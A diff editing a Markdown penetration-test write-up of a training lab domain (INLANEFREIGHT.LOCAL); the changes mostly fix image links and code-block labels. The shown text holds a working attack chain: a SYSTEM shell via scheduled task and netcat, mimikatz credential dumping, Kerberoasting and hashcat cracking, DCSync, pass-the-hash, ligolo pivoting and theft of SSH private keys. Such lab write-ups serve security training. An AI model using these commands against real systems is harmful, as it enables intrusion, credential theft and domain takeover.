@@ -1577,13 +1577,13 @@ The task monitors the Desktop folder and fires when a file is added to it:
 
 It is set to run `pwn.bat` as "any other program", with the "Login as the following user" option left unchecked, so it runs in the scheduler service's own privileged context:
 
-./ms01/7.png
+![](./ms01/7.png)
 
-./ms01/8.png
+![](./ms01/8.png)
 
 Dropping a new file into the monitored folder fires the task, and the netcat listener catches a SYSTEM shell:
 
-./ms01/9.png
+![](./ms01/9.png)
 
 ```
 C:\Users\ilfserveradm\Desktop>nc64.exe -lvnp 1337
@@ -1620,11 +1620,11 @@ type flag.txt
 
 With local admin access, `mimikatz` is run again:
 
-bash
-
 ```bash
 c:\Users\ilfserveradm\Desktop>.\mimikatz
 ```
+
+Dumping SAM:
 
 ```
 mimikatz # privilege::debug
@@ -1647,7 +1647,7 @@ User : ilfserveradm
   Hash NTLM: 22712976f35dc45157952a07c7ffc774
 ```
 
-bash
+Dumping LSA secrets:
 
 ```bash
 mimikatz # lsadump::secrets
@@ -1661,9 +1661,7 @@ Secret  : DefaultPassword
 cur/text: DBAilfreight1!
 ```
 
-Local users on the host:
-
-bash
+Enumerating local users on the host:
 
 ```bash
 c:\Users>dir
@@ -1679,8 +1677,6 @@ c:\Users>dir
 ```
 
 The `DefaultPassword` secret works domain-wide for `mssqladm`:
-
-bash
 
 ```bash
 nxc smb 172.16.8.0/24 -u mssqladm -p 'DBAilfreight1!'
@@ -1701,17 +1697,15 @@ SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\mssq
 
 BloodHound shows `mssqladm` has `GenericWrite` over `ttimmons`, who in turn has `GenericAll` over the **Server Admins** group:
 
-./bh/2.png
+![](./bh/2.png)
 
 **Server Admins** holds `GetChangesInFilteredSet` over the domain object, which is sufficient to perform a DCSync:
 
-./bh/3.png
+![](./bh/3.png)
 
-### Targeted Kerberoasting — ttimmons
+### Targeted Kerberoasting
 
 The `GenericWrite` right over `ttimmons` is abused to add a temporary SPN and request a ticket for it:
-
-bash
 
 ```bash
 python3 targetedKerberoast.py -v -d 'INLANEFREIGHT.LOCAL' -u 'mssqladm' -p 'DBAilfreight1!' --dc-ip 172.16.8.3 --request-user ttimmons
@@ -1726,7 +1720,7 @@ $krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$...
 [VERBOSE] SPN removed successfully for (ttimmons)
 ```
 
-bash
+Cracking the hash:
 
 ```bash
 hashcat -m 13100 ttimmons.hash /usr/share/wordlists/rockyou.txt
@@ -1741,7 +1735,6 @@ Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
 
 `ttimmons` then adds itself to **Server Admins** using its `GenericAll` right:
 
-bash
 
 ```bash
 net rpc group addmem "Server Admins" "ttimmons" -U "INLANEFREIGHT.LOCAL"/"ttimmons"%"Repeat09" -S DC01
@@ -1749,7 +1742,6 @@ net rpc group addmem "Server Admins" "ttimmons" -U "INLANEFREIGHT.LOCAL"/"ttimmo
 
 ### DCSync
 
-bash
 
 ```bash
 impacket-secretsdump 'INLANEFREIGHT.LOCAL'/'ttimmons':'Repeat09'@'DC01' -just-dc-user Administrator
@@ -1771,8 +1763,6 @@ Administrator:des-cbc-md5:61e31c8c2c0bd9cd
 
 The dumped NTLM hash authenticates directly to the domain controller via pass-the-hash:
 
-bash
-
 ```bash
 evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
 ```
@@ -1789,7 +1779,6 @@ evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
 ```
 
 ---
-
 ## Flag (Domain Admin)
 
 **Flag:**
@@ -1800,11 +1789,10 @@ evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
 
 ---
 
-## Post-Exploitation — Pivoting to 172.16.9.0/23
+## Pivoting to 172.16.9.0/23
 
 `DC01` has a second network interface on an unexplored range:
 
-bash
 
 ```bash
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> ipconfig
@@ -1822,7 +1810,6 @@ Ethernet adapter Ethernet1:
 
 A second ligolo listener is chained through the existing `dmz01` session:
 
-bash
 
 ```bash
 [Agent : srvadm@dmz01] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
@@ -1830,7 +1817,6 @@ bash
 
 The agent binary is uploaded to `DC01` via `evil-winrm` and run, connecting back through the chained listener:
 
-powershell
 
 ```powershell
 *Evil-WinRM* PS C:\Users\Administrator\Documents> .\agent.exe -connect 172.16.8.120:11601 -ignore-cert
@@ -1859,8 +1845,6 @@ INFO[0711] Starting tunnel to INLANEFREIGHT\Administrator@DC01 (0050568a9bb0)
 
 A sweep finds one additional live host:
 
-bash
-
 ```bash
 fping -asgq 172.16.9.0/24
 ```
@@ -1873,7 +1857,6 @@ fping -asgq 172.16.9.0/24
      252 unreachable
 ```
 
-bash
 
 ```bash
 nmap -sC -sV 172.16.9.25
@@ -1894,11 +1877,9 @@ Only SSH is reachable on `172.16.9.25`. A DCSync-based NTDS.dit dump was also at
 
 ---
 
-## SMB Share Enumeration — RSA Private Keys
+## SMB Share Enumeration
 
 With Domain Admin access, the Department Shares are browsed once more:
-
-bash
 
 ```bash
 smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2' -H 172.16.8.3 -r "Department Shares" --depth 5
@@ -1918,7 +1899,15 @@ smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea7
         SYSVOL                                                  READ, WRITE     Logon server share
 ```
 
-bash
+All the keys are downloaded on Kali:
+
+```bash
+smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2' -H 172.16.8.3 --download "Department Shares//IT/Private/Networking/harry-id_rsa"
+```
+
+```bash
+smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2' -H 172.16.8.3 --download "Department Shares//IT/Private/Networking/ssmallsadm-id_rsa"
+```
 
 ```bash
 smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2' -H 172.16.8.3 --download "Department Shares//IT/Private/Networking/ssmallsadm-id_rsa"
@@ -1926,9 +1915,8 @@ smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea7
 
 ---
 
-## MGMT01 (172.16.9.25) — SSH Access via Stolen Private Key
+## SSH access on MGMT01 (172.16.9.25)
 
-bash
 
 ```bash
 chmod 600 ssmallsadm-id_rsa
@@ -1946,7 +1934,6 @@ ssmallsadm@MGMT01:~$ id
 uid=1001(ssmallsadm) gid=1001(ssmallsadm) groups=1001(ssmallsadm)
 ```
 
-bash
 
 ```bash
 ssmallsadm@MGMT01:~$ cat flag.txt
